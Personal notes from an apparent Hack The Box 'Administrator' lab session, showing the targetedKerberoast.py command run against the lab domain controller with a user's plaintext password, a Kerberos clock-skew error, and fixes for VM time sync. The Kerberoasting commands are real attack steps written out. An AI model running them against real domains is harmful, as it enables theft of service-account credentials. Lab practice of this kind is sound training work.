downloading uv 0.11.3 aarch64-unknown-linux-gnu
installing to /home/lanc3/.local/bin
  uv
  uvx
everything's installed!
source: no such file or directory: /home/lanc3/.local/bin/env


┌──(lanc3㉿kali)-[~/targetedKerberoast]
└─$ uv add --script targetedKerberoast.py -r requirements.txt 
Resolved 28 packages in 635ms



┌──(lanc3㉿kali)-[~/targetedKerberoast]
└─$ 

```

----

python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.27.140 -U targets.txt

```
python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.27.140 -U targets.txt
[*] Starting kerberoast attacks
[*] Fetching usernames from file
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)


```
-----

to correct this issue:
KRB_AP_ERR_SKEW(Clock skew too great)


```
sudo ntpdate 10.129.27.140   
[sudo] password for lanc3: 
2026-04-06 20:03:28.585276 (+0800) +25141.661067 +/- 0.176588 10.129.27.140 s1 no-leap
CLOCK: time stepped by 25141.661067

```

-------

still having clock skew issue after ntpdate

the error **`KRB_AP_ERR_SKEW`** is telling you that your Kali machine and the Domain Controller (DC) are still out of sync by more than **5 minutes**.

Kerberos is extremely sensitive to time because it uses timestamps to prevent "replay attacks." If the clocks don't match, the DC assumes the request is malicious or expired.

---

### Why `ntpdate` might have failed you

Looking at output, `ntpdate` actually worked (`time stepped by 25141.6...`), but system clock might have drifted back or failed to hold the update. This often happens in virtual machines (VMWare/VirtualBox) because the guest OS tries to sync back to the host machine's time immediately after changing it.

----

If you do the manual set and it _still_ says "Clock skew too great," your VM software is fighting you.

- **VMware:** Go to Settings -> General -> **Uncheck "Synchronize time with host."**
    
- **VirtualBox:** You may need to run a command on your host machine to disable the guest time sync service.

Since you're using **UTM** (likely on an Apple Silicon Mac), you're hitting a specific synchronization quirk. UTM uses `qemu-guest-agent` or its own internal clock offset to keep your Kali Linux synced with your Mac's host time.

If your Mac is set to Singapore time and the Lab DC is 7 hours behind (or ahead), UTM will "correct" your manual `date -s` command almost instantly.

The "UTM" Fix (Disable Time Sync)

To stop UTM from fighting your manual changes, you need to tell it to stop syncing with your Mac:

1. **Shut down** your Kali VM.
    
2. Click the **Settings** icon for your VM in UTM.
    
3. Go to **QEMU** on the left sidebar.
    
4. Uncheck **"Local Time for RTC"**.
    
5. (Optional) If you have a **QEMU Guest Agent** enabled under the "Sharing" or "Input" sections, try disabling it temporarily, as it often forces time sync.
-----

### "Host-Side" Hack (The Easiest Way)

If you don't want to restart your VM, you can trick the system by changing your **Mac's clock** to match the DC's time.

- Go to **System Settings** -> **General** -> **Date & Time**.
    
- Turn off **"Set time and date automatically"**.
    
- Change your Mac's time to match the DC's time (from your `ntpdate` log).
    
- Your UTM Kali VM will instantly inherit this new time.
-----

### "One-Liner" Execution

If you want to stay in Linux and try to outrun the sync service, chain your commands so there is zero delay:

sudo ntpdate 10.129.27.140 && python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.27.140 -U targets.txt

----


stopping here coz i should try using my PC's kali instead

https://0xdf.gitlab.io/2025/04/19/htb-administrator.html